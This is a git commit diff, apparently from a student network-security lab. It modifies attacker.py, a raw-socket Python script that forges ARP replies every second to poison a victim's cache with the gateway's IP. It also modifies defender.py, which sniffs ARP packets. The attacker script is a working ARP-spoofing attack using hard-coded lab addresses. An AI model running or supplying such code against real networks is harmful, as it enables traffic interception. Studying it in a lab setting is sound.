034f32c14e55e357db4133f18821f3f47171297e
corlys <duscae047@gmail.com>
2020-09-07 13:36:30 +0700

    dapet di defeender paket nya

--- tif-a/11-arpsocket/attacker.py
+++ tif-a/11-arpsocket/attacker.py
@@ -10,17 +10,17 @@ import time
 
 # attacker ip. in this case us, is not important
 
-rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
 rawSocket.bind(("wlp2s0", socket.htons(0x0806)))
 
 # eth header
 gatewaymac = binascii.unhexlify('04b0e7582f42')
-victimmac = binascii.unhexlify('08002747e97d')
+victimmac = binascii.unhexlify('0800279d1833')
 sourcemac = binascii.unhexlify('cc2f71026a3e')
 spoofmac = binascii.unhexlify('032775491873')
 eth_type = binascii.unhexlify('0806')
 
-# eth_header = victimmac+sourcemac+eth_type
+eth_header = victimmac+sourcemac+eth_type
 gweth_header = gatewaymac+sourcemac+eth_type
 # arp header
 
@@ -28,17 +28,20 @@ hwtype = binascii.unhexlify('0001')
 prototype = binascii.unhexlify('0800')
 hwsize = binascii.unhexlify('06')
 protosize = binascii.unhexlify('04')
-opcode = binascii.unhexlify('0001')
+whohas = binascii.unhexlify('0001')
+isat = binascii.unhexlify('0002')
 gatewayip = socket.inet_aton('192.168.100.1') #gateway
 victimip = socket.inet_aton('192.168.100.101')
 
-arp_request = gweth_header+hwtype+prototype+hwsize+protosize+opcode+spoofmac+victimip+gatewaymac+gatewayip
+arp_request = gweth_header+hwtype+prototype+hwsize+protosize+whohas+spoofmac+victimip+gatewaymac+gatewayip
+
+arp_reply = eth_header+hwtype+prototype+hwsize+protosize+isat+sourcemac+gatewayip+victimmac+victimip
 
 # gateway_reply = gweth_header+hwtype+prototype+hwsize+protosize+opcode+sourcemac+dest_proto+gatewaymac+source_proto
 
 
 while True:
 	print('send spoof AF_PACKET')
-	rawSocket.send(arp_request)
-	# rawSocket.send(gateway_reply)
+	rawSocket.send(arp_reply)
+	# rawSocket.send(arp_request)
 	time.sleep(1)
--- tif-a/11-arpsocket/defender.py
+++ tif-a/11-arpsocket/defender.py
@@ -1,9 +1,16 @@
-import socket
 import threading
+import socket
+import binascii
+import struct
+import time
+import sys
 
-rawSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-rawSocket.bind(("wlp2s0", socket.htons(0x0806)))
+
+rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
 
 while True:
-	arpdata = rawSocket.recv(65535)
-	print(arpdata)
+   packet = rawSocket.recv(65535)
+#   print(packet)
+#   print(sys.getsizeof(packet))
+   arppacket = struct.unpack("!2s2s1s1s2s6s4s6s4s", packet[14:42])
+   print(binascii.hexlify(arppacket[4]))
